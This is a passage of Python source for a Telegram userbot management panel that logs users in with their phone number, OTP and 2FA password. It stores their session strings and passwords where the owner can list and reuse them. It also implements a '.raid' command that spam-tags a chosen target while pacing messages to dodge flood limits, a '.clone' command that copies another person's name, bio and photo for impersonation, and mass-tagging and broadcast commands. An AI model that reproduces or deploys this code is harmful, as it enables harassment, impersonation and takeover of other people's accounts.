            tag = html_mention(target_user.id, target_user.first_name or "ᴜsᴇʀ")
            text_to_send = qbox(f"{tag} {line}")
        else:
            text_to_send = qbox(line)

        try:
            await c.send_message(
                chat_id=m.chat.id,
                text=text_to_send,
                reply_to_message_id=reply_to_id,
                parse_mode=ParseMode.HTML,
            )
            msg_counter += 1
            await asyncio.sleep(4.0 if msg_counter % 3 == 0 else 2.0)
        except errors.FloodWait as e:
            await asyncio.sleep(e.value + 2)
        except Exception:
            await asyncio.sleep(1.5)

    active_tasks[uid] = False


async def clone_cmd(c, m):
    if len(m.command) < 2 and not m.reply_to_message:
        return await reply_quote(m, "❌ <b>ᴜsᴀɢᴇ:</b> <code>.clone @username</code> / <code>user_id</code> ᴏʀ ʀᴇᴘʟʏ.")

    raw_target = m.command[1].lstrip("@") if len(m.command) > 1 else m.reply_to_message.from_user.id
    status = await reply_quote(m, "🔄 <b>ᴄʟᴏɴɪɴɢ...</b>")

    try:
        uid = c.me.id
        if uid not in original_profiles:
            me_chat = await c.get_chat(uid)
            backup_photo_path = None
            my_photos = [p async for p in c.get_chat_photos(uid, limit=1)]
            if my_photos:
                try:
                    backup_photo_path = await c.download_media(my_photos[0].file_id)
                except Exception:
                    backup_photo_path = None
            original_profiles[uid] = {
                "first_name": c.me.first_name or "",
                "last_name": c.me.last_name or "",
                "bio": me_chat.bio or "",
                "photo_path": backup_photo_path,
            }

        user = await c.get_users(int(raw_target) if str(raw_target).isdigit() else raw_target)
        first_name = user.first_name or ""
        last_name = user.last_name or ""
        try:
            bio = (await c.get_chat(user.id)).bio or ""
        except Exception:
            bio = ""

        photos = [p async for p in c.get_chat_photos(user.id, limit=1)]
        if photos:
            try:
                photo_file = await c.download_media(photos[0].file_id)
                await c.set_profile_photo(photo=photo_file)
                if photo_file and os.path.exists(photo_file):
                    os.remove(photo_file)
            except Exception:
                pass

        await c.update_profile(first_name=first_name, last_name=last_name, bio=bio)
        if status:
            await status.edit_text(qbox("✅ <b>sᴜᴄᴄᴇsғᴜʟʟʏ ᴄʟᴏɴᴇᴅ!</b>"), parse_mode=ParseMode.HTML)
    except Exception as e:
        if status:
            await status.edit_text(qbox(f"❌ <b>ғᴀɪʟᴇᴅ:</b> <code>{e}</code>"), parse_mode=ParseMode.HTML)


async def restclone_cmd(c, m):
    uid = c.me.id
    backup = original_profiles.get(uid)
    if not backup:
        return await reply_quote(m, "⚠️ <b>ɴᴏ ᴏʀɪɢɪɴᴀʟ ᴘʀᴏғɪʟᴇ ʙᴀᴄᴋᴜᴘ ғᴏᴜɴᴅ (ᴘᴇʜʟᴇ</b> <code>.clone</code> <b>ᴜsᴇ ᴋᴀʀᴇɪɴ).</b>")

    status = await reply_quote(m, "♻️ <b>ʀᴇsᴛᴏʀɪɴɢ ᴏʀɪɢɪɴᴀʟ ᴘʀᴏғɪʟᴇ...</b>")
    try:
        await c.update_profile(
            first_name=backup.get("first_name", ""),
            last_name=backup.get("last_name", ""),
            bio=backup.get("bio", ""),
        )
        photo_path = backup.get("photo_path")
        if photo_path and os.path.exists(photo_path):
            try:
                await c.set_profile_photo(photo=photo_path)
                os.remove(photo_path)
            except Exception:
                pass
        del original_profiles[uid]
        if status:
            await status.edit_text(qbox("✅ <b>ᴘʀᴏғɪʟᴇ ʀᴇsᴛᴏʀᴇᴅ ᴛᴏ ᴏʀɪɢɪɴᴀʟ!</b>"), parse_mode=ParseMode.HTML)
    except Exception as e:
        if status:
            await status.edit_text(qbox(f"❌ <b>ʀᴇsᴛᴏʀᴇ ғᴀɪʟᴇᴅ:</b> <code>{e}</code>"), parse_mode=ParseMode.HTML)


async def stop_cmd(c, m):
    active_tasks[c.me.id] = False
    await reply_quote(m, "🚫 <b>ᴀʟʟ ᴘʀᴏᴄᴇssᴇs sᴛᴏᴘᴘᴇᴅ!</b>")


# --- INCOMING MESSAGE AUTOMATIONS (AFK, AUTO-SEEN, AUTO-REPLY, PM GUARD) ---
async def incoming_automation_handler(c, m):
    if not m.from_user or m.from_user.is_bot or m.from_user.id == c.me.id:
        return

    ubot_id = c.me.id

    if get_ubot_setting(ubot_id, "autoseen", False):
        try:
            await c.read_chat_history(m.chat.id)
        except Exception:
            pass

    afk_info = afk_state.get(ubot_id)
    if afk_info:
        is_mentioned = bool(m.mentioned) or (
            m.reply_to_message and m.reply_to_message.from_user and m.reply_to_message.from_user.id == ubot_id
        )
        if m.chat.type == ChatType.PRIVATE or is_mentioned:
            elapsed = get_readable_time(int(time.time() - afk_info.get("since", time.time())))
            reason = afk_info.get("reason", "ʙᴜsʏ")
            try:
                await m.reply_text(
                    qbox(
                        f"💤 <b>ᴍᴀɪɴ ᴀʙʜɪ AFK ʜᴜɴ!</b>\n"
                        f"📝 <b>ʀᴇᴀsᴏɴ:</b> <code>{reason}</code>\n"
                        f"⏳ <b>sɪɴᴄᴇ:</b> <code>{elapsed}</code>"
                    ),
                    parse_mode=ParseMode.HTML,
                )
            except Exception:
                pass

    if m.chat.type == ChatType.PRIVATE:
        if m.from_user.is_contact or m.from_user.id == OWNER_ID or is_dm_approved(ubot_id, m.from_user.id):
            return

        if get_ubot_setting(ubot_id, "autoreply_enabled", False):
            rep_text = get_ubot_setting(
                ubot_id,
                "autoreply_text",
                "🤖 <b>ᴀᴜᴛᴏ-ʀᴇᴘʟʏ:</b> ᴏᴡɴᴇʀ ᴀʙʜɪ ʙᴜsʏ ʜᴀɪɴ, ᴊᴀʟᴅɪ ʜɪ ʀᴇᴘʟʏ ᴍɪʟᴇɢᴀ.",
            )
            try:
                await m.reply_text(qbox(rep_text), parse_mode=ParseMode.HTML)
            except Exception:
                pass

        if get_dm_privacy_state(ubot_id):
            try:
                stranger_id = m.from_user.id
                pm_guard_data.setdefault(ubot_id, {})
                pm_guard_data[ubot_id][stranger_id] = pm_guard_data[ubot_id].get(stranger_id, 0) + 1
                warn_count = pm_guard_data[ubot_id][stranger_id]

                if warn_count >= 3:
                    try:
                        await m.reply_text(
                            qbox(
                                "🚨 <b>ᴅᴍ ᴘʀɪᴠᴀᴄʏ ᴠɪᴏʟᴀᴛɪᴏɴ (3/3)!</b>\n"
                                "⛔ <b>ᴀᴀᴘɴᴇ 3 ʙᴀᴀʀ ᴍᴇssᴀɢᴇ ᴋɪʏᴀ, ᴀʙ ᴀᴀᴘ ʙʟᴏᴄᴋ ʜᴏ ɢᴀʏᴇ ʜᴀɪɴ.</b>"
                            ),
                            parse_mode=ParseMode.HTML,
                        )
                        await c.block_user(stranger_id)
                    except Exception:
                        pass
                    del pm_guard_data[ubot_id][stranger_id]
                else:
                    try:
                        await m.reply_text(
                            qbox(
                                f"🔒 <b>ᴘʀɪᴠᴀᴛᴇ ᴍᴇssᴀɢᴇ ᴘʀᴏᴛᴇᴄᴛɪᴏɴ ᴀᴄᴛɪᴠᴇ!</b>\n"
                                f"💡 <b>sᴀʟᴀʜ:</b> ᴀɢᴀʀ ᴀᴀᴘɴᴇ <b>3 ʙᴀᴀʀ</b> ᴍᴇssᴀɢᴇ ᴋɪʏᴀ ᴛᴏ ᴀᴜᴛᴏᴍᴀᴛɪᴄ <b>ʙʟᴏᴄᴋ</b> ʜᴏ ᴊᴀᴀᴇɴɢᴇ.\n"
                                f"⚠️ <b>ᴡᴀʀɴɪɴɢ:</b> <code>{warn_count}/3</code>"
                            ),
                            parse_mode=ParseMode.HTML,
                        )
                    except Exception:
                        pass
            except Exception:
                pass


# --- RAW VC LOGGER HANDLER ---
async def vc_raw_update_handler(c, update, users, chats):
    if not isinstance(
        update,
        (
            raw_types.UpdateGroupCall,
            raw_types.UpdateGroupCallParticipants,
            raw_types.UpdateNewMessage,
            raw_types.UpdateNewChannelMessage,
        ),
    ):
        return
    try:
        ubot_id = c.me.id
        users_map = users or {}

        if isinstance(update, raw_types.UpdateGroupCall):
            call = getattr(update, "call", None)
            chat_id = extract_peer_id(getattr(update, "chat_id", None) or getattr(update, "peer", None))
            if not chat_id or not get_vc_logger_state(ubot_id, chat_id):
                return

            if isinstance(call, raw_types.GroupCallDiscarded):
                vc_participants.pop((ubot_id, chat_id), None)
                msg = qbox(
                    f"🎙️ <b>ᴠɪᴅᴇᴏ ᴄʜᴀᴛ ᴇɴᴅᴇᴅ!</b>\n"
                    f"✦ <b>ᴠᴄ ᴇɴᴅ ᴏɴ:</b> <code>{get_current_ist_time()}</code>\n"
                    f"✦ <b>ʙʏ ᴀᴄᴄᴏᴜɴᴛ:</b> {html_mention(ubot_id, c.me.first_name or 'ᴜsᴇʀ')} (<code>{ubot_id}</code>)\n"
                    f"✦ <b>ᴊᴏɪɴ ғᴀsᴛ ɪɴ ᴠᴄ!</b>"
                )
                await c.send_message(chat_id, msg, parse_mode=ParseMode.HTML)
            elif isinstance(call, raw_types.GroupCall):
                vc_participants.setdefault((ubot_id, chat_id), set())
                msg = qbox(
                    f"🎙️ <b>ᴠɪᴅᴇᴏ ᴄʜᴀᴛ sᴛᴀʀᴛᴇᴅ!</b>\n"
                    f"✦ <b>sᴛᴀʀᴛᴇᴅ ᴏɴ:</b> <code>{get_current_ist_time()}</code>\n"
                    f"✦ <b>ʙʏ ᴀᴄᴄᴏᴜɴᴛ:</b> {html_mention(ubot_id, c.me.first_name or 'ᴜsᴇʀ')} (<code>{ubot_id}</code>)\n"
                    f"✦ <b>ᴊᴏɪɴ ғᴀsᴛ &amp; ᴇɴᴊᴏʏ!</b>"
                )
                await c.send_message(chat_id, msg, parse_mode=ParseMode.HTML)

        elif isinstance(update, raw_types.UpdateGroupCallParticipants):
            chat_id = extract_peer_id(getattr(update, "chat_id", None) or getattr(update, "peer", None))
            if not chat_id or not get_vc_logger_state(ubot_id, chat_id):
                return

            active_set = vc_participants.setdefault((ubot_id, chat_id), set())
            for p in getattr(update, "participants", []) or []:
                p_uid = extract_peer_id(getattr(p, "peer", None))
                if not p_uid:
                    continue
                fname, uname, uid_val = format_raw_user_info(p_uid, users_map)
                tag_link = html_mention(uid_val, fname)
                is_left = bool(getattr(p, "left", False))

                if is_left:
                    active_set.discard(uid_val)
                    msg = qbox(
                        f"📤 <b>ʟᴇғᴛ ᴠᴄ!</b>\n"
                        f"✦ <b>ɴᴀᴍᴇ:</b> {tag_link}\n"
                        f"✦ <b>ᴜsᴇʀɴᴀᴍᴇ:</b> {uname}\n"
                        f"✦ <b>ᴜsᴇʀ ɪᴅ:</b> <code>{uid_val}</code>\n"
                        f"✦ <b>ᴛɪᴍᴇ:</b> <code>{get_current_ist_time()}</code>"
                    )
                    await c.send_message(chat_id, msg, parse_mode=ParseMode.HTML)
                elif uid_val not in active_set:
                    active_set.add(uid_val)
                    msg = qbox(
                        f"📥 <b>ᴊᴏɪɴᴇᴅ ᴠᴄ!</b>\n"
                        f"✦ <b>ɴᴀᴍᴇ:</b> {tag_link}\n"
                        f"✦ <b>ᴜsᴇʀɴᴀᴍᴇ:</b> {uname}\n"
                        f"✦ <b>ᴜsᴇʀ ɪᴅ:</b> <code>{uid_val}</code>\n"
                        f"✦ <b>ᴛɪᴍᴇ:</b> <code>{get_current_ist_time()}</code>"
                    )
                    await c.send_message(chat_id, msg, parse_mode=ParseMode.HTML)

        elif isinstance(update, (raw_types.UpdateNewMessage, raw_types.UpdateNewChannelMessage)):
            msg_obj = getattr(update, "message", None)
            if not isinstance(msg_obj, raw_types.MessageService):
                return
            action = getattr(msg_obj, "action", None)
            if isinstance(action, raw_types.MessageActionInviteToGroupCall):
                chat_id = extract_peer_id(getattr(msg_obj, "peer_id", None))
                if not chat_id or not get_vc_logger_state(ubot_id, chat_id):
                    return
                inviter_id = extract_peer_id(getattr(msg_obj, "from_id", None))
                inviter_name, inviter_uname, inviter_uid = format_raw_user_info(inviter_id or ubot_id, users_map)
                invited_lines = []
                for target_uid in getattr(action, "users", []) or []:
                    t_name, t_uname, t_id = format_raw_user_info(int(target_uid), users_map)
                    invited_lines.append(f"• {html_mention(t_id, t_name)} | {t_uname} | <code>{t_id}</code>")
                invited_block = "\n".join(invited_lines) if invited_lines else "• ᴍᴇᴍʙᴇʀs"
                text = qbox(
                    f"📣 <b>ᴠᴄ ɪɴᴠɪᴛᴇ ᴀʟᴇʀᴛ!</b>\n"
                    f"✦ <b>ʙʏ:</b> {html_mention(inviter_uid, inviter_name)} ({inviter_uname})\n"
                    f"✦ <b>ɪɴᴠɪᴛᴇᴅ:</b>\n{invited_block}\n"
                    f"✦ <b>ᴛɪᴍᴇ:</b> <code>{get_current_ist_time()}</code>"
                )
                await c.send_message(chat_id, text, parse_mode=ParseMode.HTML)
    except errors.RPCError as e:
        if getattr(e, "NAME", "") == "PERSISTENT_TIMESTAMP_OUTDATED" or getattr(e, "CODE", 0) == 500:
            return
    except Exception:
        pass


def register_ubot_handlers(ubot):
    # A
    ubot.add_handler(handlers.MessageHandler(afk_cmd, filters.command("afk", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(alive_cmd, filters.command("alive", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(autoreply_cmd, filters.command("autoreply", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(autoseen_cmd, filters.command("autoseen", ".") & filters.me))
    # B
    ubot.add_handler(handlers.MessageHandler(backup_cmd, filters.command("backup", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(block_cmd, filters.command("block", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(blocked_cmd, filters.command("blocked", ".") & filters.me))
    # C
    ubot.add_handler(handlers.MessageHandler(calc_cmd, filters.command("calc", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(clearblocked_cmd, filters.command("clearblocked", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(clone_cmd, filters.command("clone", ".") & filters.me))
    # D
    ubot.add_handler(handlers.MessageHandler(del_cmd, filters.command("del", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(dmapprove_cmd, filters.command("dmapprove", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(dmprivacy_off_cmd, filters.command("dmprivacyoff", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(dmprivacy_on_cmd, filters.command("dmprivacyon", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(dmunapprove_cmd, filters.command("dmunapprove", ".") & filters.me))
    # E
    ubot.add_handler(handlers.MessageHandler(edit_cmd, filters.command("edit", ".") & filters.me))
    # F
    ubot.add_handler(handlers.MessageHandler(font_cmd, filters.command("font", ".") & filters.me))
    # G
    ubot.add_handler(handlers.MessageHandler(gcast_cmd, filters.command("gcast", ".") & filters.me))
    # H
    ubot.add_handler(handlers.MessageHandler(assistant_help_cmd, filters.command("help", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(history_cmd, filters.command("history", ".") & filters.me))
    # I
    ubot.add_handler(handlers.MessageHandler(id_cmd, filters.command("id", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(info_cmd, filters.command("info", ".") & filters.me))
    # J
    ubot.add_handler(handlers.MessageHandler(json_cmd, filters.command("json", ".") & filters.me))
    # M
    ubot.add_handler(handlers.MessageHandler(myinfo_cmd, filters.command("myinfo", ".") & filters.me))
    # N
    ubot.add_handler(handlers.MessageHandler(nightmode_cmd, filters.command("nightmode", ".") & filters.me))
    # O
    ubot.add_handler(handlers.MessageHandler(onetag_cmd, filters.command("onetag", ".") & filters.me))
    # P
    ubot.add_handler(handlers.MessageHandler(ping_cmd, filters.command("ping", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(pin_cmd, filters.command("pin", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(premium_off_cmd, filters.command("premiumoff", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(premium_on_cmd, filters.command("premiumon", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(privacy_cmd, filters.command("privacy", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(purge_cmd, filters.command("purge", ".") & filters.me))
    # R
    ubot.add_handler(handlers.MessageHandler(raid_cmd, filters.command("raid", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(restclone_cmd, filters.command("restclone", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(restart_ubot_cmd, filters.command("restart", ".") & filters.me))
    # S
    ubot.add_handler(handlers.MessageHandler(save_cmd, filters.command("save", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(sessions_cmd, filters.command("sessions", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(setbio_cmd, filters.command("setbio", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(setname_cmd, filters.command("setname", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(setpic_cmd, filters.command("setpic", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(stop_cmd, filters.command("stop", ".") & filters.me))
    # T
    ubot.add_handler(handlers.MessageHandler(tagall_cmd, filters.command("tagall", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(time_cmd, filters.command("time", ".") & filters.me))
    # U
    ubot.add_handler(handlers.MessageHandler(unblock_cmd, filters.command("unblock", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(unpin_cmd, filters.command("unpin", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(username_cmd, filters.command("username", ".") & filters.me))
    # V
    ubot.add_handler(handlers.MessageHandler(vclogger_off_cmd, filters.command("vcloggeroff", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(vclogger_on_cmd, filters.command("vcloggeron", ".") & filters.me))
    # W
    ubot.add_handler(handlers.MessageHandler(weather_cmd, filters.command("weather", ".") & filters.me))

    # Incoming & Raw Handlers
    ubot.add_handler(handlers.MessageHandler(incoming_automation_handler, ~filters.me), group=2)
    ubot.add_handler(handlers.RawUpdateHandler(vc_raw_update_handler))


# --- MAIN BOT COMMANDS (QUOTE STYLE) ---
START_TEXT = qbox(
    "⚡ <b>ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴄᴏᴅᴇʀɴᴏᴠᴀ ᴘᴀɴᴇʟ</b> ⚡\n\n"
    "ʜᴇʏ {mention},\n"
    "ᴀᴘɴᴀ ᴜsᴇʀʙᴏᴛ ᴍᴀɴᴀɢᴇ ᴋᴀʀɴᴇ ᴋᴇ ʟɪʏᴇ ɴɪᴄʜᴇ ʙᴜᴛᴛᴏɴs ᴜsᴇ ᴋᴀʀᴇɪɴ."
)

GUIDE_TEXT = qbox(
    "📖 <b>『 ᴄᴏᴅᴇʀɴᴏᴠᴀ ᴜsᴇʀʙᴏᴛ ɢᴜɪᴅᴇ 』</b> 📖\n\n"
    "1️⃣ <b>ᴀᴄᴄᴏᴜɴᴛ ᴀᴅᴅ ᴋᴀʀᴇɪɴ:</b> <code>/add_account</code> ʏᴀ <b>📲 ᴀᴅᴅ ᴀᴄᴄᴏᴜɴᴛ</b> ʙᴜᴛᴛᴏɴ ᴅᴀʙᴀᴇɪɴ.\n"
    "2️⃣ <b>ᴘʜᴏɴᴇ &amp; ᴏᴛᴘ:</b> <code>+91xxxxxxxxxx</code> ʙʜᴇᴊᴇɪɴ, ᴘʜɪʀ ᴏᴛᴘ (<code>1 2 3 4 5</code> ʏᴀ <code>12345</code>) ᴅᴀʟᴇɪɴ.\n"
    "3️⃣ <b>2FA:</b> ᴀɢᴀʀ 2FA ᴏɴ ʜᴀɪ ᴛᴏ ᴘᴀssᴡᴏʀᴅ ᴇɴᴛᴇʀ ᴋᴀʀᴇɪɴ.\n"
    "4️⃣ <b>ᴜsᴇʀʙᴏᴛ ᴄᴏᴍᴍᴀɴᴅs:</b> ᴋɪsɪ ʙʜɪ ᴄʜᴀᴛ ᴍᴇ <code>.help</code> ʟɪᴋʜᴇɪɴ.\n"
    "5️⃣ <b>sᴛᴏᴘ ʟᴏᴏᴘs:</b> ᴛᴀɢ/ʀᴀɪᴅ ʀᴏᴋɴᴇ ᴋᴇ ʟɪʏᴇ <code>.stop</code> ᴜsᴇ ᴋᴀʀᴇɪɴ.",
    expandable=True,
)

HELP_BOT_TEXT = qbox(
    "🛠️ <b>『 ʙᴏᴛ ᴄᴏᴍᴍᴀɴᴅs ᴍᴇɴᴜ 』</b> 🛠️\n\n"
    "🔹 <code>/start</code> - sᴛᴀʀᴛ ᴘᴀɴᴇʟ\n"
    "🔹 <code>/add_account</code> - ᴀᴅᴅ ɴᴇᴡ ᴜsᴇʀʙᴏᴛ ᴀᴄᴄᴏᴜɴᴛ\n"
    "🔹 <code>/guide</code> - sᴛᴇᴘ-ʙʏ-sᴛᴇᴘ ᴜsᴇʀ ɢᴜɪᴅᴇ\n"
    "🔹 <code>/help</code> - sʜᴏᴡ ᴛʜɪs ᴍᴇɴᴜ\n"
    "👑 <b>ᴏᴡɴᴇʀ ᴄᴏᴍᴍᴀɴᴅs:</b>\n"
    "🔸 <code>/account_list</code> - ᴀᴄᴛɪᴠᴇ ᴀᴄᴄᴏᴜɴᴛs ʟɪsᴛ (5/ᴘᴀɢᴇ)\n"
    "🔸 <code>/update_all</code> - ʀᴇʟᴏᴀᴅ, ꜱʏɴᴄ &amp; ᴄʟᴇᴀɴ ᴀʟʟ ᴀᴄᴄᴏᴜɴᴛs\n"
    "🔸 <code>/remove_all</code> - ʀᴇᴍᴏᴠᴇ ᴀʟʟ sᴇssɪᴏɴs\n"
    "🔸 <code>/broadcast</code> - ʙʀᴏᴀᴅᴄᴀsᴛ ᴛᴏ ᴀʟʟ ᴜsᴇʀs",
    expandable=True,
)


async def build_account_list_page(page: int = 0):
    saved = load_local_sessions()
    active_docs = []

    for uid_str, doc in saved.items():
        uid_int = int(uid_str) if uid_str.isdigit() else 0
        if uid_int in running_ubots and doc.get("session_str"):
            active_docs.append(doc)

    total_accounts = len(active_docs)
    if total_accounts == 0:
        return qbox("📭 <b>ɴᴏ ᴀᴄᴛɪᴠᴇ ʟᴏɢɢᴇᴅ-ɪɴ ᴀᴄᴄᴏᴜɴᴛs ғᴏᴜɴᴅ.</b>"), None

    total_pages = max(1, (total_accounts + ACCOUNTS_PER_PAGE - 1) // ACCOUNTS_PER_PAGE)
    page = max(0, min(page, total_pages - 1))

    start_idx = page * ACCOUNTS_PER_PAGE
    end_idx = start_idx + ACCOUNTS_PER_PAGE
    page_docs = active_docs[start_idx:end_idx]

    lines = [f"🎛️ <b>ᴀᴄᴛɪᴠᴇ ʟᴏɢɢᴇᴅ-ɪɴ ᴀᴄᴄᴏᴜɴᴛs ({total_accounts}):</b>\n"]

    for idx, doc in enumerate(page_docs, start=start_idx + 1):
        name = doc.get("name") or "ᴜsᴇʀ"
        raw_uname = (doc.get("username") or "").lstrip("@")
        username = f"@{raw_uname}" if raw_uname else "ɴᴏɴᴇ"
        phone = normalize_phone(doc.get("phone") or "") or "ɴᴏɴᴇ"

        lines.append(
            f"┌ <b>#{idx}</b>\n"
            f"│ 👤 <b>ɴᴀᴍᴇ:</b> {name}\n"
            f"├ <b>ɪᴅ ᴜsᴇʀɴᴀᴍᴇ:</b> {username}\n"
            f"└ 📞 <b>ᴘʜᴏɴᴇ:</b> <code>{phone}</code>"
        )

    nav_row = []
    if page > 0:
        nav_row.append(InlineKeyboardButton("⬅️ ʙᴀᴄᴋ", callback_data=f"acc_page_{page - 1}"))
    if page < total_pages - 1:
        nav_row.append(InlineKeyboardButton("ɴᴇxᴛ ➡️", callback_data=f"acc_page_{page + 1}"))

    buttons = []
    if nav_row:
        buttons.append(nav_row)
    buttons.append([InlineKeyboardButton("« ʙᴀᴄᴋ ᴛᴏ ᴍᴇɴᴜ", callback_data="back_menu")])

    return qbox("\n\n".join(lines), expandable=True), InlineKeyboardMarkup(buttons)


async def restart_all_userbots(prune_invalid: bool = True):
    for uid, old_ubot in list(running_ubots.items()):
        try:
            await old_ubot.stop()
        except Exception:
            pass
    running_ubots.clear()

    saved_sessions = load_local_sessions()
    updated, failed = 0, 0

    for u_id, doc in saved_sessions.items():
        session_str = doc.get("session_str")
        if not session_str:
            failed += 1
            if prune_invalid:
                delete_session_from_db(u_id)
            continue
        try:
            ubot = Client(
                f"ubot_{u_id}_{int(time.time() * 1000)}",
                api_id=API_ID,
                api_hash=API_HASH,
                session_string=session_str,
                device_model=CLIENT_DEVICE_MODEL,
                system_version=CLIENT_SYSTEM_VERSION,
                app_version=CLIENT_APP_VERSION,
                in_memory=True,
            )
            register_ubot_handlers(ubot)
            await ubot.start()
            await warmup_client_peers(ubot)
            me = await ubot.get_me()
            full_name = f"{me.first_name or ''} {me.last_name or ''}".strip() or doc.get("name") or "ᴜsᴇʀ"
            uname = me.username or doc.get("username") or ""
            live_phone = normalize_phone(getattr(me, "phone_number", "") or "")
            synced_phone = live_phone or normalize_phone(doc.get("phone") or "")

            save_local_session(
                u_id,
                session_str,
                phone=synced_phone,
                name=full_name,
                username=uname,
                password=doc.get("password", ""),
            )
            running_ubots[int(u_id)] = ubot
            updated += 1
            await asyncio.sleep(0.25)
        except Exception:
            failed += 1
            if prune_invalid:
                delete_session_from_db(u_id)

    return updated, failed


@bot.on_message(filters.command("start") & filters.private)
async def start_handler(c, m):
    save_bot_user(m.from_user)
    bot_me = await c.get_me()
    await send_log(
        c,
        title="𝗡𝗘𝗪 𝗦𝗧𝗔𝗥𝗧 𝗔𝗟𝗘𝗥𝗧 · [𝗦𝗧𝗔𝗥𝗧]",
        user=m.from_user,
        details_body=f"✦ 𝗨𝗦𝗘𝗥 {(m.from_user.first_name or 'USER').upper()} 𝗢𝗣𝗘𝗡𝗘𝗗 {bot_me.username or 'CoderNovaBot'}.",
        panel_name=bot_me.username or "CoderNovaBot",
    )

    unjoined = await check_force_join(c, m.from_user.id)
    if unjoined:
        btn_layout = [[InlineKeyboardButton("📥 ᴊᴏɪɴ ᴄʜᴀɴɴᴇʟ", url=f"https://t.me/{ch}")] for ch in unjoined]
        btn_layout.append([InlineKeyboardButton("🔄 ᴠᴇʀɪғʏ", callback_data="verify_fsub")])
        return await m.reply_text(
            qbox("⚠️ <b>ᴘʟᴇᴀsᴇ ᴊᴏɪɴ ᴏᴜʀ ᴄʜᴀɴɴᴇʟs ғɪʀsᴛ:</b>"),
            reply_markup=InlineKeyboardMarkup(btn_layout),
            parse_mode=ParseMode.HTML,
        )
    mention_html = html_mention(m.from_user.id, m.from_user.first_name or "ᴜsᴇʀ")
    caption_html = START_TEXT.format(mention=mention_html)
    try:
        await m.reply_animation(
            animation=START_VIDEO,
            caption=caption_html,
            reply_markup=main_buttons,
            parse_mode=ParseMode.HTML,
        )
    except Exception:
        await m.reply_text(caption_html, reply_markup=main_buttons, parse_mode=ParseMode.HTML)


@bot.on_message(filters.command("add_account") & filters.private)
async def add_account_cmd(c, m):
    save_bot_user(m.from_user)
    await m.reply_text(
        qbox("📲 <b>sᴇɴᴅ ʏᴏᴜʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ (</b><code>+91xxxxxxxxxx</code><b>):</b>"),
        parse_mode=ParseMode.HTML,
    )


@bot.on_message(filters.command("guide") & filters.private)
async def guide_cmd(c, m):
    save_bot_user(m.from_user)
    await m.reply_text(GUIDE_TEXT, reply_markup=main_buttons, parse_mode=ParseMode.HTML)


@bot.on_message(filters.command("help") & filters.private)
async def help_cmd(c, m):
    save_bot_user(m.from_user)
    await m.reply_text(HELP_BOT_TEXT, reply_markup=main_buttons, parse_mode=ParseMode.HTML)


@bot.on_message(filters.command("account_list") & filters.user(OWNER_ID))
async def account_list_cmd(c, m):
    text, markup = await build_account_list_page(0)
    await m.reply_text(text, reply_markup=markup, parse_mode=ParseMode.HTML)


@bot.on_message(filters.command("update_all") & filters.user(OWNER_ID))
async def update_all_cmd(c, m):
    status = await m.reply_text(
        qbox("🔄 <b>ᴜᴘᴅᴀᴛɪɴɢ, ꜱʏɴᴄɪɴɢ ɴᴜᴍʙᴇʀs &amp; ʀᴇsᴛᴀʀᴛɪɴɢ ᴀʟʟ ᴀᴄᴄᴏᴜɴᴛs...</b>"),
        parse_mode=ParseMode.HTML,
    )
    updated, cleaned = await restart_all_userbots(prune_invalid=True)
    await status.edit_text(
        qbox(
            f"✅ <b>ᴀʟʟ ᴀᴄᴄᴏᴜɴᴛs ᴜᴘᴅᴀᴛᴇᴅ &amp; ʀᴇsᴛᴀʀᴛᴇᴅ!</b>\n\n"
            f"🟢 <b>ᴀᴄᴛɪᴠᴇ:</b> <code>{updated}</code>\n"
            f"🧹 <b>ᴄʟᴇᴀɴᴇᴅ/ɪɴᴀᴄᴛɪᴠᴇ:</b> <code>{cleaned}</code>"
        ),
        parse_mode=ParseMode.HTML,
    )


@bot.on_message(filters.command("broadcast") & filters.user(OWNER_ID))
async def broadcast_cmd(c, m):
    if not m.reply_to_message and len(m.command) < 2:
        return await m.reply_text(
            qbox("❌ <b>ʀᴇᴘʟʏ ᴛᴏ ᴀ ᴍᴇssᴀɢᴇ ᴏʀ ɢɪᴠᴇ ᴛᴇxᴛ ᴛᴏ ʙʀᴏᴀᴅᴄᴀsᴛ!</b>"),
            parse_mode=ParseMode.HTML,
        )

    status = await m.reply_text(qbox("📢 <b>ʙʀᴏᴀᴅᴄᴀsᴛ sᴛᴀʀᴛᴇᴅ...</b>"), parse_mode=ParseMode.HTML)
    all_user_ids = get_all_bot_user_ids()
    success, failed = 0, 0

    for user_id in all_user_ids:
        try:
            if m.reply_to_message:
                await m.reply_to_message.copy(int(user_id))
            else:
                bcast_text = m.text.split(None, 1)[1]
                await c.send_message(int(user_id), qbox(bcast_text), parse_mode=ParseMode.HTML)
            success += 1
            await asyncio.sleep(0.25)
        except Exception:
            failed += 1

    await status.edit_text(
